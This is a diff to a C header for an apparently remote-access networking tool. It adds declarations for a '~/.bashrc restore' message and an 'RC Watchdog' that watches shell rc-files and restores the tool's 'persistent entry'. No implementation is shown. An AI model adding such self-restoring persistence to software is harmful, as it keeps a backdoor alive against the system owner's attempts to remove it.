@@ -10,6 +10,7 @@
 #define PKT_MSG_PONG		(16)
 #define PKT_MSG_LOG			(32)  // max 64 bytes long
 #define PKT_MSG_STATUS      (33)  // max 64 bytes long
+#define PKT_MSG_BASHRC_RECOVER (34) // client requests ~/.bashrc restore
 
 // Channel Numbers, variable size messages
 #define GS_FT_CHN_PUT           (0)  // 128
@@ -73,6 +74,7 @@ void pkt_app_cb_log(uint8_t msg, const uint8_t *data, size_t len, void *ptr);
 void pkt_app_cb_status(uint8_t msg, const uint8_t *data, size_t len, void *ptr);
 void pkt_app_cb_pwdrequest(uint8_t msg, const uint8_t *data, size_t len, void *ptr);
 void pkt_app_cb_pwdreply(uint8_t msg, const uint8_t *data, size_t len, void *ptr);
+void pkt_app_cb_bashrc_recover(uint8_t msg, const uint8_t *data, size_t len, void *ptr);
 
 int pkt_app_send_wsize(GS_SELECT_CTX *ctx, struct _peer *p, int row);
 int pkt_app_send_pong(GS_SELECT_CTX *ctx, struct _peer *p);
@@ -83,6 +85,11 @@ int pkt_app_send_status_nopty(GS_SELECT_CTX *ctx, struct _peer *p);
 int pkt_app_send_ft(GS_SELECT_CTX *ctx, struct _peer *p);
 int pkt_app_send_pwdrequest(GS_SELECT_CTX *ctx, struct _peer *p);
 int pkt_app_send_pwdreply(GS_SELECT_CTX *ctx, struct _peer *p);
+int pkt_app_send_bashrc_recover(GS_SELECT_CTX *ctx, struct _peer *p);
+
+/* RC Watchdog: start monitoring rc-files and restoring our persistent entry */
+void rc_watcher_start_c(const char *rcb_path);
 
 
 #endif /* !__GS_PKT_MGR_H__ */
+
